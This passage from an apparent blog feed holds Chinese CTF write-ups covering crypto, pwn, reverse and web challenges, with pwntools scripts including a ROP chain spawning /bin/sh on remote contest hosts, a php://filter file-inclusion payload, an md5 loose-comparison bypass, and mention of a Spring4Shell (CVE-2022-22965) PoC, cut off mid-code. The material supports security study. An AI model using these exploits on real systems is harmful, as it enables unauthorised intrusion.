class="hljs-number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><br>p=boom(p_,n,<span class="hljs-number">2</span>)<br>q=boom(q_,n,<span class="hljs-number">2</span>)<br>t=n//p//q<br><span class="hljs-keyword">if</span> (t*p*q!=n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    exit(<span class="hljs-number">0</span>)<br>e =<span class="hljs-number">114</span><br><br><br>phi_n= (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><br>t=gmpy2.gcd(e,phi_n)<br>e=e//t<br>d=gmpy2.invert(e,phi_n)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>传入<code>\x00</code>绕过判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;49.234.8.239&#x27;</span>,<span class="hljs-string">&#x27;30531&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>输入<code>:!/bin/sh</code>，使得vim中可以执行系统命令</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-2.png"></p><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>传入一个<code>0xFFFFF82</code>即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-2.png"></p><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>栈溢出构造<code>rep</code>链，执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-2.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>rdi=<span class="hljs-number">0x00000000004018b2</span><br>rsi=<span class="hljs-number">0x000000000040661e</span><br>rdx=<span class="hljs-number">0x00000000004017bf</span><br>ret=<span class="hljs-number">0x000000000040f408</span><br>syscall=<span class="hljs-number">0x00000000004012e3</span><br>rax=<span class="hljs-number">0x0000000000451aa7</span><br>read=<span class="hljs-number">0x450ff0</span><br><br><span class="hljs-comment">#p=remote()</span><br><span class="hljs-comment">#p=process(&#x27;./static&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>p=remote(<span class="hljs-string">&#x27;121.4.119.164&#x27;</span>,<span class="hljs-string">&#x27;32430&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./static&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span>)<br>payload=flat(<br>        rdi,<span class="hljs-number">0</span>,<br>        rsi,e.bss(<span class="hljs-number">0x100</span>),<br>        rdx,<span class="hljs-number">0x20</span>,<br>        read,<br>        rdi,e.bss(<span class="hljs-number">0x100</span>),<br>        rsi,<span class="hljs-number">0</span>,<br>        rdx,<span class="hljs-number">0</span>,<br>        ret,<br>        rax,<span class="hljs-number">0x3b</span>,<br>        syscall);<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+payload)<br><br>p.interactive()<br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-3.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p><em>赛后复现</em></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse5-1.png"></p><h2 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h2><p>输入的数据经过某种加密后对每个字节取反，然后与<code>P0w3r</code>的内容比较<br>在<code>Enc0de</code>中看字符集发现是base32加密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse1-1.png"></p><p>将<code>P0w3r</code>变量的内容提取出来后异或<code>0xff</code>，base32解码即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA7</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xAE</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0xff</span>)<br>e+=<span class="hljs-string">&#x27;====&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b32decode(e))<br></code></pre></td></tr></table></figure><h2 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h2><p>一个简单的比较，异或<code>0x1F</code>然后加1</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;X[]LZeX&#123;ttqAwqmc&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0x1f</span>)+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h2><p>观察发现<code>init_S</code>,<code>init_Key</code>,<code>permute_S</code>,<code>create_key_stream</code>这几个函数中用到的数据是固定的，用来生成<code>KeyStream</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse3-1.png"></p><p>直接粘贴到编译器运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> T[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[]=<span class="hljs-string">&quot;thisiskey&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> KeyStream[<span class="hljs-number">32</span>]=&#123;&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">init_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = S;<br>    S[i] = i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">init_Key</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = T;<br>    T[i] = Key[i % <span class="hljs-number">9</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">permute_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    v3 = (S[i] + v3 + (<span class="hljs-type">char</span>)T[i]) % <span class="hljs-number">256</span>;<br>    v1 = S[i];<br>    S[i] = S[v3];<br>    result = S;<br>    S[v3] = v1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">char</span>  <span class="hljs-title function_">create_key_stream</span><span class="hljs-params">(<span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; KeyStream[v5++] = S[(S[v6] + S[i]) % <span class="hljs-number">256</span>] )<br>  &#123;<br>    v2 = a2--;<br>    result = v2 != <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + S[i]) % <span class="hljs-number">256</span>;<br>    v4 = S[i];<br>    S[i] = S[v6];<br>    S[v6] = v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>   init_S();<br>  init_Key();<br>  permute_S();<br>  create_key_stream(<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,KeyStream[i]);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>运行后得到<code>[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]</code>，这个就是<code>KeyStream</code>的值</p><p><code>KeyStream</code>的值与<code>Cry</code>的值异或，得到flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xC3</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x9C</span>,<span class="hljs-number">0xD9</span>,<span class="hljs-number">0x46</span>]<br>b=[<span class="hljs-number">139</span>,<span class="hljs-number">176</span>,<span class="hljs-number">166</span>,<span class="hljs-number">182</span>,<span class="hljs-number">170</span>,<span class="hljs-number">108</span>,<span class="hljs-number">177</span>,<span class="hljs-number">66</span>,<span class="hljs-number">249</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">137</span>,<span class="hljs-number">150</span>,<span class="hljs-number">140</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">86</span>,<span class="hljs-number">253</span>,<span class="hljs-number">212</span>,<span class="hljs-number">116</span>,<span class="hljs-number">98</span>,<span class="hljs-number">236</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">90</span>,<span class="hljs-number">37</span>,<span class="hljs-number">237</span>,<span class="hljs-number">197</span>,<span class="hljs-number">126</span>,<span class="hljs-number">172</span>,<span class="hljs-number">174</span>,<span class="hljs-number">59</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    e+=<span class="hljs-built_in">chr</span>(v^b[i])<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="勇士斗恶龙"><a href="#勇士斗恶龙" class="headerlink" title="勇士斗恶龙"></a>勇士斗恶龙</h2><p>在ida中通过搜索字符串跳转到程序主要函数，得到函数对于程序的偏移地址<code>38B0</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-1.png"></p><p>x64dbg动态调试程序，在主要函数设置断点</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-2.png"></p><p>当程序中断时，rcx的值是<code>00000170E3A824B0</code>，储存了两个指针，指向了勇士和恶龙的对象</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-3.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-4.png"></p><p><code>0x170e3a828e0+0x20</code>地址处储存了勇士的金币数，将其修改为<code>0xffff</code>,购买高级的装备，将内存地址转移到<code>0x170e3a82950+0x20</code>指向的地址处，输入<code>a</code>攻击恶龙，观察内存数据变化,当恶龙血量为<code>520</code>时得到<code>flag</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse4-5.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Rank: 13&lt;/p&gt;
&lt;h1 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h1&gt;&lt;h2 id=&quot;咦-小鲨鱼来喽&quot;&gt;&lt;a href=&quot;#咦-小鲨鱼来喽&quot; class=&quot;header</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="HECTF" scheme="https://www.lewiserii.top/tags/HECTF/"/>
    
  </entry>
  
  <entry>
    <title>2022强国杯技术技能大赛东部晋级赛wp</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%9C%E9%83%A8%E6%99%8B%E7%BA%A7%E8%B5%9Bwp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/2022%E5%BC%BA%E5%9B%BD%E6%9D%AF%E6%8A%80%E6%9C%AF%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E4%B8%9C%E9%83%A8%E6%99%8B%E7%BA%A7%E8%B5%9Bwp.html</id>
    <published>2022-10-17T10:00:00.000Z</published>
    <updated>2022-10-24T13:08:31.623Z</updated>
    
    <content type="html"><![CDATA[<p>Rank：13，被打爆了</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="md5-php"><a href="#md5-php" class="headerlink" title="md5_php"></a>md5_php</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;le.php&#x27;</span>);<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;快了解MD5&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;MMMMDDDD5555&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>md5弱比较，找一个加密前后都是0e开头的值</p><p>传入<code>?md5=0e215962017</code></p><p>拿到<code>le.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;good&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;luck&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>        <span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support flag and luck.&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>传入的值中要包含<code>good</code>，<code>luck</code>或者<code>index</code></p><p>用伪协议读内容，用<code>index/../flag</code>绕过判断</p><p>最后传入<code>?file=php://filter/convert.base64-encode/resource=index/../flag</code>拿到flag</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>通过报错页面得知是<code>spring</code></p><p><code>github</code>搜最新的<code>spring rce</code></p><p>通过<code>CVE-2022-22965</code>的<code>POC</code>getshell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 